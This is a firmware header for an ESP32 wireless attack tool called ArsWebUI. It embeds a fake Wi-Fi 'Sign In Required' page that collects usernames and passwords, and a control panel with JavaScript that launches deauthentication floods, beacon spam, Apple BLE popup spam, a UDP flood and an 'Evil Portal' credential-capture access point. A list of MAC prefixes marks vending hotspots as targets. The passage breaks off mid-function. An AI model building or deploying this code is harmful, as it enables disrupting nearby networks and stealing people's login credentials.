#pragma once
#include <Arduino.h>

// ArsWebUI v4.beta — Marauder + Apple Juice + Evil Portal
// Embedded HTML — no SPIFFS data upload required.
// Three strings:
//   INDEX_HTML   — main control WebUI (served at /)
//   CAPTIVE_HTML — login page served by Evil Portal (/captive)
//   SUCCESS_HTML — post-submit page (/success)

// ─── CAPTIVE PORTAL LOGIN PAGE ────────────────────────────────────────────────
const char CAPTIVE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Sign in to network</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f4f8;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
     min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:16px;box-shadow:0 4px 32px rgba(0,0,0,.12);
      padding:32px 28px;width:100%;max-width:380px}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:48px;height:48px}
h1{text-align:center;font-size:20px;font-weight:700;color:#1a202c;margin-bottom:6px}
p{text-align:center;font-size:13px;color:#718096;margin-bottom:24px;line-height:1.5}
label{display:block;font-size:12px;font-weight:600;color:#4a5568;margin-bottom:5px;letter-spacing:.3px}
input{width:100%;padding:11px 14px;border:1.5px solid #e2e8f0;border-radius:8px;
      font-size:14px;color:#2d3748;background:#fafafa;transition:border .15s,box-shadow .15s;
      font-family:inherit;margin-bottom:16px}
input:focus{outline:none;border-color:#4299e1;box-shadow:0 0 0 3px rgba(66,153,225,.15);background:#fff}
.btn{width:100%;padding:13px;background:linear-gradient(135deg,#4299e1,#3182ce);
     color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;
     cursor:pointer;transition:opacity .15s;letter-spacing:.3px;margin-top:4px}
.btn:hover{opacity:.92}
.btn:active{transform:scale(.98)}
.footer{text-align:center;font-size:11px;color:#a0aec0;margin-top:20px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="24" cy="24" r="24" fill="#EBF8FF"/>
      <path d="M8 22c4-8 24-14 32-2" stroke="#4299E1" stroke-width="2.5" stroke-linecap="round"/>
      <path d="M13 27c3-5 18-10 22-1" stroke="#4299E1" stroke-width="2.5" stroke-linecap="round"/>
      <path d="M19 32c2-3 10-5 12 0" stroke="#4299E1" stroke-width="2.5" stroke-linecap="round"/>
      <circle cx="24" cy="38" r="3" fill="#4299E1"/>
    </svg>
  </div>
  <h1>Sign In Required</h1>
  <p>You need to sign in to access the internet.</p>
  <form method="POST" action="/login">
    <label for="u">Username or Email</label>
    <input type="text" id="u" name="username" placeholder="Enter your username" autocomplete="username" required>
    <label for="p">Password</label>
    <input type="password" id="p" name="password" placeholder="Enter your password" autocomplete="current-password" required>
    <button type="submit" class="btn">Sign In</button>
  </form>
  <div class="footer">Powered by network authentication</div>
</div>
</body>
</html>
)rawliteral";

// ─── CAPTIVE PORTAL SUCCESS PAGE ──────────────────────────────────────────────
const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Connected</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f4f8;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
     min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:16px;box-shadow:0 4px 32px rgba(0,0,0,.12);
      padding:40px 28px;width:100%;max-width:360px;text-align:center}
.icon{width:64px;height:64px;background:#c6f6d5;border-radius:50%;
      display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.icon svg{width:32px;height:32px}
h1{font-size:22px;font-weight:700;color:#1a202c;margin-bottom:10px}
p{font-size:14px;color:#718096;line-height:1.6}
</style>
</head>
<body>
<div class="card">
  <div class="icon">
    <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M6 16l8 8L26 8" stroke="#38a169" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  </div>
  <h1>You're Connected!</h1>
  <p>Your credentials have been verified. You can now access the internet.</p>
</div>
</body>
</html>
)rawliteral";

// ─── MAIN CONTROL UI ─────────────────────────────────────────────────────────
const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>ArsWebUI v5 — Marauder + Connected Attack</title>
<style>
:root{
  --bg:#0b0e14;--card:#12161f;--border:#1c2333;
  --accent:#00d4aa;--red:#ff3b5c;--yellow:#ffb020;
  --green:#00d4aa;--purple:#a78bfa;--blue:#38bdf8;
  --cyan:#06b6d4;
  --text:#e2e8f0;--muted:#64748b;--panel:#0f131a;
}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);
     font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
.wrap{max-width:960px;margin:0 auto;padding:10px}

.hdr{background:linear-gradient(135deg,#0a0f18,#0d1520);
     border:1px solid #1a2332;border-radius:12px;
     padding:16px;margin-bottom:10px;text-align:center;position:relative;overflow:hidden}
.hdr::before{content:'';position:absolute;inset:0;
  background:radial-gradient(ellipse at top,#00d4aa11,transparent 60%);pointer-events:none}
.hdr h1{font-size:22px;font-weight:900;letter-spacing:4px;
        color:var(--accent);text-shadow:0 0 20px #00d4aa44}
.hdr-sub{color:var(--muted);font-size:10px;letter-spacing:2px;margin-top:4px}
.live-row{display:flex;justify-content:center;gap:20px;margin-top:10px;
          font-size:11px;font-weight:700;letter-spacing:1px;flex-wrap:wrap}
.live-row span{color:var(--muted)}.live-row b{color:var(--accent)}
#liveStatus{color:var(--purple)}
.net-row{display:flex;justify-content:center;gap:14px;margin-top:6px;
         font-size:10px;letter-spacing:.8px;flex-wrap:wrap}
.net-row span{color:var(--muted)}.net-row b{color:var(--green)}
.net-row .ota-b{color:var(--yellow)}

.nav{display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap}
.nav-btn{flex:1;min-width:72px;padding:10px 8px;background:var(--panel);
         border:1px solid var(--border);border-radius:8px;color:var(--muted);
         font-size:10px;font-weight:800;letter-spacing:1px;text-transform:uppercase;
         cursor:pointer;transition:all .15s;text-align:center}
.nav-btn:hover{border-color:var(--accent);color:var(--accent)}
.nav-btn.active{background:#0a2018;border-color:var(--accent);color:var(--accent);
                box-shadow:0 0 12px #00d4aa22}

.card{background:var(--card);border:1px solid var(--border);
      border-radius:10px;padding:14px;margin-bottom:10px;display:none}
.card.show{display:block}
.card-h{font-size:10px;font-weight:800;letter-spacing:2px;text-transform:uppercase;
        color:var(--muted);border-bottom:1px solid var(--border);
        padding-bottom:8px;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;border-radius:50%;background:var(--accent);flex-shrink:0}
.dot.r{background:var(--red)}.dot.y{background:var(--yellow)}
.dot.p{background:var(--purple)}.dot.g{background:var(--green)}
.dot.o{background:#f59e0b}.dot.b{background:var(--blue)}
.dot.c{background:var(--cyan)}

.btn{padding:9px 14px;border:none;border-radius:7px;cursor:pointer;
     font-size:11px;font-weight:700;letter-spacing:.4px;
     font-family:inherit;transition:all .13s}
.btn:active{transform:scale(.96)}
.btn-blue{background:#0369a1;color:#fff}.btn-blue:hover{background:#0284c7}
.btn-red{background:#be123c;color:#fff}.btn-red:hover{background:#e11d48}
.btn-yel{background:#b45309;color:#fff}.btn-yel:hover{background:#d97706}
.btn-pur{background:#6d28d9;color:#fff}.btn-pur:hover{background:#7c3aed}
.btn-green{background:#047857;color:#fff}.btn-green:hover{background:#059669}
.btn-cyan{background:#0e7490;color:#fff}.btn-cyan:hover{background:#0891b2}
.btn-stop{background:#1c0a0a;color:#fca5a5;border:1px solid #7f1d1d}
.btn-stop:hover{background:#7f1d1d}
.btn-grey{background:#151b28;color:#94a3b8;border:1px solid var(--border)}
.btn-grey:hover{background:#1e2742}
.btn-sel{padding:4px 9px;background:#0369a1;color:#fff;border:none;
         border-radius:5px;cursor:pointer;font-size:10px;font-weight:700}
.btn-sel:hover{background:#0284c7}
.btn-csa{padding:4px 9px;background:#6d28d9;color:#fff;border:none;
         border-radius:5px;cursor:pointer;font-size:10px;font-weight:700}
.btn-csa:hover{background:#5b21b6}
.btn-ep{padding:4px 9px;background:#0e7490;color:#fff;border:none;
        border-radius:5px;cursor:pointer;font-size:10px;font-weight:700}
.btn-ep:hover{background:#0891b2}
.btn-auto{padding:4px 9px;border:1px solid var(--border);background:#0d1321;
          color:var(--muted);border-radius:5px;cursor:pointer;
          font-size:10px;font-weight:700;transition:all .15s}
.btn-auto.on{background:#0a2010;border-color:var(--green);color:var(--green)}

.badge{display:inline-block;padding:3px 11px;border-radius:20px;
       font-size:10px;font-weight:800;letter-spacing:.8px}
.b-off{background:#111620;color:#4b5675}
.b-on{background:#3b0808;color:#fca5a5;animation:pulse 1.4s infinite}
.b-udp{background:#3b2000;color:#fbbf24}
.b-bcn{background:#1e0a40;color:#c4b5fd}
.b-csa{background:#002a28;color:#6ee7b7}
.b-aj{background:#1a1030;color:#c4b5fd}
.b-portal{background:#06253a;color:#67e8f9;animation:pulse 1.4s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.55}}

table{width:100%;border-collapse:collapse;font-size:11px}
th{padding:7px 5px;text-align:left;color:var(--muted);font-size:9px;
   letter-spacing:1px;border-bottom:1px solid var(--border);font-weight:700;text-transform:uppercase}
td{padding:7px 5px;border-bottom:1px solid #0b0e14;vertical-align:middle}
tr:hover td{background:#141925}

.field{margin-bottom:11px}
.field label{display:block;font-size:9px;color:var(--muted);
             font-weight:700;letter-spacing:1px;margin-bottom:4px;text-transform:uppercase}
.field input,.field select{
  width:100%;padding:8px 11px;background:#07090e;
  border:1px solid var(--border);border-radius:6px;
  color:var(--text);font-size:12px;font-family:inherit;transition:border .12s}
.field input:focus,.field select:focus{
  outline:none;border-color:var(--accent);box-shadow:0 0 0 2px rgba(0,212,170,.12)}
.field input::placeholder{color:#2a3348}
.row2{display:grid;grid-template-columns:1fr 1fr;gap:10px}

.inten-row{display:grid;grid-template-columns:repeat(4,1fr);gap:5px;margin-bottom:11px}
.ib{padding:7px 3px;border:1px solid var(--border);border-radius:6px;
    background:#07090e;color:var(--muted);cursor:pointer;
    font-size:9px;font-weight:700;letter-spacing:.4px;text-align:center;
    transition:all .13s;line-height:1.6}
.ib:hover{border-color:var(--accent);color:var(--accent)}
.il{background:#081a30;border-color:#38bdf8;color:#38bdf8}
.im{background:#1c1400;border-color:#f59e0b;color:#fbbf24}
.ih{background:#1f0b00;border-color:#ef4444;color:#fca5a5}
.ix{background:#140028;border-color:#a855f7;color:#d8b4fe}

.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:7px}
.stat{background:#07090e;border:1px solid var(--border);border-radius:8px;padding:11px}
.stat-l{color:var(--muted);font-size:8px;letter-spacing:1.5px;text-transform:uppercase;
        font-weight:700;margin-bottom:4px}
.stat-v{color:var(--accent);font-weight:800;font-size:14px;word-break:break-all}

.ota-block{background:#070b10;border:1px solid #1a2a18;border-radius:8px;padding:12px;margin-bottom:10px}
.ota-block .ota-ip{font-family:monospace;font-size:13px;color:var(--green);font-weight:800;letter-spacing:.5px}
.ota-block .ota-sub{font-size:10px;color:var(--muted);margin-top:4px;line-height:1.7}

.ctrls{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
.info{background:#0a1628;border-left:3px solid var(--accent);
      padding:9px 12px;border-radius:5px;font-size:11px;color:#93c5fd;margin:7px 0;line-height:1.6}
.hint{font-size:9px;color:var(--muted);margin-top:-7px;margin-bottom:10px}
.foot{text-align:center;padding:12px;color:#1e2742;font-size:9px;letter-spacing:2px;margin-top:6px}
.scan-hdr{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.sta-block{background:#07090e;border:1px solid var(--border);border-radius:8px;
           padding:10px 13px;margin-bottom:10px;display:flex;align-items:center;
           gap:10px;flex-wrap:wrap}
.sta-label{font-size:9px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;
           color:var(--muted);flex-shrink:0}
.sta-val{font-size:12px;font-weight:700;color:var(--muted);font-family:monospace;flex:1;
         min-width:120px}
.sta-val.conn{color:var(--green)}
.sta-val.fail{color:var(--red)}
.sta-val.busy{color:var(--yellow)}
.badge-piso{background:#2d1600;color:#fb923c;border:1px solid #92400e;
            padding:2px 7px;border-radius:4px;font-size:9px;font-weight:800;letter-spacing:.5px}
.scan-auto-lbl{font-size:9px;color:var(--muted);font-weight:700;letter-spacing:1px;text-transform:uppercase}
.loading{text-align:center;padding:20px;color:var(--muted);font-size:12px}
.log-box{background:#050708;border:1px solid var(--border);border-radius:6px;
         padding:9px 11px;font-family:monospace;font-size:10px;color:#4ade80;
         max-height:160px;overflow-y:auto;white-space:pre-wrap;line-height:1.75;margin-top:7px}
.cred-box{background:#050708;border:1px solid #0e7490;border-radius:6px;
          padding:9px 11px;font-family:monospace;font-size:11px;color:#67e8f9;
          max-height:200px;overflow-y:auto;white-space:pre-wrap;line-height:1.8;margin-top:7px}
@media(max-width:560px){
  .row2,.inten-row{grid-template-columns:1fr 1fr}
  .stats{grid-template-columns:1fr 1fr}
  .nav-btn{min-width:64px;font-size:9px}
}
</style>
</head>
<body>
<div class="wrap">

<div class="hdr">
  <h1>ArsWebUI</h1>
  <div class="hdr-sub">ESP32-S3 N16R8 ▸ 19.5 dBm ▸ v5 MARAUDER + PORTAL + CONNECTED ATTACK</div>
  <div class="live-row">
    <span>PKTS <b id="liveCount">0</b></span>
    <span>STATUS <b id="liveStatus">IDLE</b></span>
    <span>HEAP <b id="liveHeap">—</b></span>
  </div>
  <div class="net-row">
    <span>WEB <b id="liveWebIP">—</b></span>
    <span>OTA <b class="ota-b" id="liveOtaIP">—</b></span>
    <span>PORTAL <b id="livePortalStatus" style="color:var(--muted)">OFF</b></span>
  </div>
</div>

<div class="sta-block" id="staBlock">
  <span class="sta-label">STA</span>
  <span class="sta-val" id="staStatusVal">Checking...</span>
  <button class="btn btn-red" id="attackConnBtn" style="display:none;font-size:10px;padding:6px 11px"
          onclick="attackConnected()">⚡ ATTACK CONNECTED</button>
</div>

<div class="nav">
  <button class="nav-btn active" onclick="showTab('scan')">SCAN</button>
  <button class="nav-btn" onclick="showTab('attack')">ATTACK</button>
  <button class="nav-btn" onclick="showTab('beacon')">BEACON</button>
  <button class="nav-btn" onclick="showTab('juice')">APPLE</button>
  <button class="nav-btn" onclick="showTab('portal')">PORTAL</button>
  <button class="nav-btn" onclick="showTab('udp')">UDP</button>
  <button class="nav-btn" onclick="showTab('config')">CONFIG</button>
  <button class="nav-btn" onclick="showTab('sys')">SYS</button>
</div>

<!-- SCAN -->
<div class="card show" id="tab-scan">
  <div class="card-h">
    <span class="dot"></span>
    <div class="scan-hdr" style="flex:1">
      <span>Network Scanner</span>
      <span class="scan-auto-lbl" style="margin-left:auto">AUTO</span>
      <button class="btn-auto" id="autoScanBtn" onclick="toggleAutoScan()">OFF</button>
    </div>
  </div>
  <div class="ctrls">
    <button class="btn btn-blue" onclick="scanWiFi()">SCAN NETWORKS</button>
    <button class="btn btn-blue" onclick="scanClients()">PASSIVE CLIENTS</button>
  </div>
  <div id="scanArea"><div class="loading">Tap SCAN to discover networks</div></div>
  <div id="clientArea" style="display:none;margin-top:12px">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
      <span style="font-size:9px;color:var(--muted);font-weight:700;letter-spacing:1px;text-transform:uppercase">PASSIVE AUTO-REFRESH</span>
      <button class="btn-auto" id="autoClientBtn" onclick="toggleAutoClient()">OFF</button>
    </div>
    <div id="clientTable"><div class="loading">...</div></div>
  </div>
</div>

<!-- ATTACK -->
<div class="card" id="tab-attack">
  <div class="card-h"><span class="dot r"></span>Deauth &amp; CSA</div>
  <div class="row2">
    <div class="field">
      <label>Target BSSID</label>
      <input type="text" id="bssidInput" placeholder="AA:BB:CC:DD:EE:FF" maxlength="17" style="text-transform:uppercase;font-family:monospace">
    </div>
    <div class="field">
      <label>SSID (display)</label>
      <input type="text" id="ssidInput" placeholder="auto-filled" readonly style="color:#4b5675">
    </div>
  </div>
  <div class="row2">
    <div class="field">
      <label>Channel</label>
      <select id="channelSelect">
        <option value="0">— select —</option>
        <option value="1">1</option><option value="2">2</option><option value="3">3</option>
        <option value="4">4</option><option value="5">5</option><option value="6">6</option>
        <option value="7">7</option><option value="8">8</option><option value="9">9</option>
        <option value="10">10</option><option value="11">11</option>
        <option value="12">12</option><option value="13">13</option>
      </select>
    </div>
    <div class="field">
      <label>Client MAC (optional)</label>
      <input type="text" id="clientInput" placeholder="empty = broadcast" maxlength="17" style="text-transform:uppercase;font-family:monospace">
    </div>
  </div>
  <div class="field"><label>Attack Intensity</label>
    <div class="inten-row">
      <div class="ib il" id="ib1" onclick="setInten(1)">LOW<br>8f</div>
      <div class="ib im" id="ib2" onclick="setInten(2)">MED<br>20f</div>
      <div class="ib ih active" id="ib3" onclick="setInten(3)">HIGH<br>40f</div>
      <div class="ib ix" id="ib4" onclick="setInten(4)">MAX<br>80f</div>
    </div>
  </div>
  <div style="margin-bottom:12px">
    <span style="font-size:9px;color:var(--muted);font-weight:700;letter-spacing:1px;text-transform:uppercase">STATUS</span>
    <span id="attackBadge" class="badge b-off" style="margin-left:8px">IDLE</span>
    <span id="attackType" style="font-size:10px;color:var(--muted);margin-left:8px"></span>
  </div>
  <div class="ctrls">
    <button class="btn btn-red" onclick="startDeauth()">DEAUTH</button>
    <button class="btn btn-red" onclick="startDeauthAll()">DEAUTH ALL</button>
    <button class="btn btn-red" onclick="startDeauthAllCh()">DEAUTH CH1-13</button>
    <button class="btn btn-pur" onclick="startCSA()">CSA</button>
    <button class="btn btn-stop" onclick="stopAll()">STOP ALL</button>
  </div>
  <div style="margin-top:12px;padding-top:10px;border-top:1px solid var(--border)">
    <div class="card-h" style="border:none;padding:0;margin-bottom:8px">
      <span class="dot r"></span>
      <span style="font-size:9px;color:var(--muted)">CONNECTED WIFI ATTACK</span>
    </div>
    <div id="connAttackInfo" class="info" style="margin-bottom:8px;font-size:10px">
      Loading STA status...
    </div>
    <div class="ctrls">
      <button class="btn btn-red" id="deauthConnBtn" onclick="attackConnected()">⚡ ATTACK CONNECTED WIFI</button>
    </div>
  </div>
</div>

<!-- BEACON -->
<div class="card" id="tab-beacon">
  <div class="card-h"><span class="dot p"></span>Beacon Spam</div>
  <div class="info">Injects 20 fake SSIDs across channels 1-13. Randomized BSSIDs per burst.</div>
  <div class="ctrls">
    <button class="btn btn-pur" onclick="startBeacon()">START BEACON</button>
    <button class="btn btn-stop" onclick="stopAll()">STOP</button>
  </div>
</div>

<!-- APPLE JUICE -->
<div class="card" id="tab-juice">
  <div class="card-h"><span class="dot p"></span>Apple Juice — BLE Popup Spam</div>
  <div class="info">Spams Apple Proximity BLE advertisements — triggers AirPods / Beats / AppleTV pairing popups on nearby iPhones and Macs.</div>
  <div class="ctrls">
    <button class="btn btn-pur" onclick="startAppleJuice()">START APPLE JUICE</button>
    <button class="btn btn-stop" onclick="stopAppleJuiceUI()">STOP</button>
  </div>
</div>

<!-- EVIL PORTAL -->
<div class="card" id="tab-portal">
  <div class="card-h"><span class="dot c"></span>Evil Portal — Credential Capture</div>
  <div class="info">
    Spawns an open AP (default: Free-WiFi). Captive DNS hijacks all traffic to a fake login page.
    Credentials POST to /login and are stored in memory below.
    <br><br>
    ⚠ Portal is exclusive — all other attacks stop when portal starts.
    The control AP (%s) goes offline while portal runs; auto-reconnect handles this.
  </div>
  <div class="field" style="margin-top:12px">
    <label>Portal SSID (leave blank for "Free-WiFi")</label>
    <input type="text" id="portalSSID" placeholder="Free-WiFi" maxlength="32">
  </div>
  <div style="margin-bottom:12px">
    <span style="font-size:9px;color:var(--muted);font-weight:700;letter-spacing:1px;text-transform:uppercase">STATUS</span>
    <span id="portalBadge" class="badge b-off" style="margin-left:8px">IDLE</span>
    <span id="portalCredCount" style="font-size:10px;color:var(--cyan);margin-left:10px"></span>
  </div>
  <div class="ctrls">
    <button class="btn btn-cyan" onclick="startPortal()">START PORTAL</button>
    <button class="btn btn-stop" onclick="stopPortal()">STOP PORTAL</button>
    <button class="btn btn-grey" onclick="loadCreds()">REFRESH CREDS</button>
    <button class="btn btn-grey" onclick="clearCreds()">CLEAR CREDS</button>
  </div>
  <div id="credsBox" class="cred-box" style="display:none">(none)</div>
</div>

<!-- UDP FLOOD -->
<div class="card" id="tab-udp">
  <div class="card-h"><span class="dot y"></span>UDP Flood</div>
  <div class="row2">
    <div class="field">
      <label>Target IP</label>
      <input type="text" id="udpIP" placeholder="192.168.1.1">
    </div>
    <div class="field">
      <label>Port</label>
      <input type="number" id="udpPort" value="80" min="1" max="65535">
    </div>
  </div>
  <div class="ctrls">
    <button class="btn btn-yel" onclick="startUDP()">START UDP</button>
    <button class="btn btn-stop" onclick="stopAll()">STOP</button>
  </div>
</div>

<!-- CONFIG -->
<div class="card" id="tab-config">
  <div class="card-h"><span class="dot b"></span>Configuration</div>
  <div class="row2">
    <div>
      <div class="field">
        <label>STA SSID</label>
        <input type="text" id="staSSID" placeholder="Network SSID">
      </div>
      <div class="field">
        <label>STA Password</label>
        <input type="password" id="staPass" placeholder="Network password">
      </div>
      <button class="btn btn-blue" onclick="saveSTA()">SAVE STA</button>
    </div>
    <div>
      <div class="field">
        <label>AP SSID</label>
        <input type="text" id="apSSID" placeholder="New AP name" maxlength="32">
      </div>
      <div class="field">
        <label>AP Password (min 8)</label>
        <input type="password" id="apPass" placeholder="New AP pass" minlength="8">
      </div>
      <button class="btn btn-yel" onclick="saveAP()">RENAME AP</button>
    </div>
  </div>
  <div style="margin-top:14px">
    <div class="field">
      <label>OTA Password</label>
      <input type="password" id="otaPassInput" placeholder="Min 4 chars">
    </div>
    <button class="btn btn-grey" onclick="saveOTAPass()">SET OTA PASS</button>
  </div>
</div>

<!-- SYS -->
<div class="card" id="tab-sys">
  <div class="card-h"><span class="dot g"></span>System</div>
  <div class="ota-block">
    <div class="ota-ip" id="otaWebAddr">—</div>
    <div class="ota-sub">
      OTA: <span id="otaFlashAddr">—</span><br>
      Upload .bin in Arduino IDE: Sketch → Upload → Port → Network port
    </div>
  </div>
  <div id="sysInfo"><div class="loading">Loading...</div></div>
  <div style="margin-top:12px">
    <div style="font-size:9px;color:var(--muted);font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:6px">EVENT LOG</div>
    <div id="logBox" class="log-box">(loading...)</div>
  </div>
</div>

<div class="foot">ArsWebUI v5 · ESP32-S3 N16R8 · Connected Attack + Piso Detection · 4080</div>

</div><!-- /wrap -->
<script>
// ── Tab navigation
var tabs=['scan','attack','beacon','juice','portal','udp','config','sys'];

// ── Piso WiFi / vendo OUI prefixes (first 3 bytes of MAC, uppercase no colon)
var PISO_OUIS=[
  'A0F3C1','A8548B','C4E984','1C7EE5','74DA38','B4EED4',
  'C83A35','D850E6','E894F6','308445','5067F0','C4A81D',
  '48EE0C','78545E','9CADEF','B0487A','C01174','EC086B',
  '1062EB','386010','5C0272','60F182','788CB5','9CA9E4',
  'B49141','D47AE2','0026B9','00904C','246895','8C8590'
];
function isPisoOUI(bssid){
  var prefix=bssid.replace(/:/g,'').substring(0,6).toUpperCase();
  return PISO_OUIS.indexOf(prefix)>=0;
}
function showTab(t){
  tabs.forEach(function(id){
    var el=document.getElementById('tab-'+id);
    if(el){el.classList.toggle('show',id===t);}
  });
  document.querySelectorAll('.nav-btn').forEach(function(b,i){
    b.classList.toggle('active',tabs[i]===t);
  });
}

// ── Intensity
var curInten=3;
function setInten(v){
  curInten=v;
  [1,2,3,4].forEach(function(i){
    var el=document.getElementById('ib'+i);
    if(el){el.classList.toggle('active',i===v);}
  });
}

// ── Badge helpers
function setBadge(type){
  var el=document.getElementById('attackBadge');
  if(!el)return;
  var classMap={
    'idle':'b-off','deauth':'b-on','deauthall':'b-on','deauthallch':'b-on',
    'beacon':'b-bcn','csa':'b-csa','udpflood':'b-udp','applejuice':'b-aj','portal':'b-portal'
  };
  el.className='badge '+(classMap[type]||'b-off');
  el.textContent=type.toUpperCase();
}
function setType(t){var el=document.getElementById('attackType');if(el)el.textContent=t;}

// ── Status monitor
var statusMon=null;
function startStatusMon(){if(statusMon)return;statusMon=setInterval(pollStatus,2500);}
function stopStatusMon(){if(statusMon){clearInterval(statusMon);statusMon=null;}}
function pollStatus(){
  fetch('/attack_status').then(function(r){return r.text();}).then(function(d){
    var p=d.split(',');
    var running=p[0]==='1';
    var type=p[1]||'idle';
    document.getElementById('liveCount').textContent=p[2]||'0';
    if(!running){setBadge('idle');setType('');stopStatusMon();}
    else setBadge(type);
  }).catch(function(){});
}

// ── Auto scan
var autoScanTimer=null;
function toggleAutoScan(){
  var btn=document.getElementById('autoScanBtn');
  if(autoScanTimer){clearInterval(autoScanTimer);autoScanTimer=null;btn.textContent='OFF';btn.classList.remove('on');}
  else{autoScanTimer=setInterval(scanWiFi,8000);btn.textContent='ON';btn.classList.add('on');scanWiFi();}
}
function scanWiFi(){
  document.getElementById('scanArea').innerHTML='<div class="loading">Scanning...</div>';
  fetch('/scan').then(function(r){return r.text();}).then(function(d){
    var wrap=document.createElement('div');
    wrap.innerHTML='<table><thead><tr><th>#</th><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th><th>ENC</th><th>TYPE</th><th>ACTION</th></tr></thead><tbody>'+d+'</tbody></table>';
    // Post-process: tag Piso WiFi rows
    var rows=wrap.querySelectorAll('tbody tr');
    rows.forEach(function(row){
      var cells=row.querySelectorAll('td');
      if(cells.length<6)return;
      var bssid=cells[2]?cells[2].textContent.trim():'';
      var typeTd=document.createElement('td');
      if(isPisoOUI(bssid)){
        typeTd.innerHTML='<span class="badge-piso">PISO</span>';
        row.style.background='#180a00';
      } else {
        typeTd.textContent='—';
        typeTd.style.color='#2a3348';
      }
      // Insert type cell before action (last cell)
      var lastCell=cells[cells.length-1];
      row.insertBefore(typeTd,lastCell);
    });
    document.getElementById('scanArea').innerHTML='';
    document.getElementById('scanArea').appendChild(wrap);
  }).catch(function(){document.getElementById('scanArea').innerHTML='<div class="loading" style="color:#ef4444">Failed</div>';});
}

// ── Auto client
var autoClientTimer=null;
function toggleAutoClient(){
  var btn=document.getElementById('autoClientBtn');
  if(autoClientTimer){clearInterval(autoClientTimer);autoClientTimer=null;btn.textContent='OFF';btn.classList.remove('on');}
  else{autoClientTimer=setInterval(refreshClients,5000);btn.textContent='ON';btn.classList.add('on');}
}
function scanClients(){document.getElementById('clientArea').style.display='block';refreshClients();}
function refreshClients(){
  fetch('/scan_clients').then(function(r){return r.text();}).then(function(d){
    document.getElementById('clientTable').innerHTML=
      '<table><thead><tr><th>MAC</th><th>RSSI</th><th>CH</th><th>LAST</th><th>ACTION</th></tr></thead><tbody>'+d+'</tbody></table>';
  }).catch(function(){document.getElementById('clientTable').innerHTML='<div class="loading" style="color:#ef4444">Failed</div>';});
}

function selTarget(bssid,ch,ssid){
  document.getElementById('bssidInput').value=bssid;
  document.getElementById('ssidInput').value=ssid;
  document.getElementById('channelSelect').value=ch;
  showTab('attack');
}
function selCSA(bssid,ch,ssid){selTarget(bssid,ch,ssid);setTimeout(startCSA,200);}
function startPortalAP(ssid){
  document.getElementById('portalSSID').value=ssid;
  showTab('portal');
  setTimeout(startPortal,200);
}

function startDeauth(){
  var bssid=document.getElementById('bssidInput').value.trim().toUpperCase();
  var ch=document.getElementById('channelSelect').value;
  var ssid=document.getElementById('ssidInput').value.trim();
  var cli=document.getElementById('clientInput').value.trim().toUpperCase();
  if(!bssid){alert('Enter BSSID');return;}
  if(ch==='0'){alert('Select channel');return;}
  if(!confirm('Deauth '+(ssid||bssid)+' CH'+ch+' ?'))return;
  fetch('/deauth?bssid='+bssid+'&ch='+ch+'&ssid='+encodeURIComponent(ssid)+'&client='+cli+'&inten='+curInten)
    .then(function(r){return r.text();}).then(function(d){
      if(d.indexOf('ERROR')>-1){alert(d);return;}
      setBadge('deauth');setType('→ '+(ssid||bssid));startStatusMon();
    }).catch(function(){alert('Request failed');});
}
function startDeauthAll(){
  if(!confirm('Deauth ALL nearby (AP stays up)?'))return;
  fetch('/deauth_all?inten='+curInten).then(function(r){return r.text();}).then(function(d){
    if(d.indexOf('ERROR')>-1){alert(d);return;}
    setBadge('deauthall');setType('→ all (AP up)');startStatusMon();
  }).catch(function(){alert('Failed');});
}
function startDeauthAllCh(){
  if(!confirm('Deauth CH1-13? AP hops briefly.'))return;
  fetch('/deauth_all_ch?inten='+curInten).then(function(r){return r.text();}).then(function(d){
    if(d.indexOf('ERROR')>-1){alert(d);return;}
    setBadge('deauthallch');setType('→ ch1-13');startStatusMon();startAutoReconnect();
  }).catch(function(){setBadge('deauthallch');setType('→ ch1-13');startAutoReconnect();});
}
var reconnectTimer=null;
function startAutoReconnect(){
  if(reconnectTimer)return;
  reconnectTimer=setInterval(function(){
    fetch('/attack_status',{signal:AbortSignal.timeout(1500)}).then(function(r){return r.text();}).then(function(d){
      var p=d.split(',');
      if(p[0]==='0'){stopAutoReconnect();setBadge('idle');setType('');stopStatusMon();}
      else{setBadge(p[1]||'deauthallch');document.getElementById('liveCount').textContent=p[2]||'0';}
    }).catch(function(){});
  },1800);
}
function stopAutoReconnect(){if(reconnectTimer){clearInterval(reconnectTimer);reconnectTimer=null;}}

function startCSA(){
  var bssid=document.getElementById('bssidInput').value.trim().toUpperCase();
  var ch=document.getElementById('channelSelect').value;
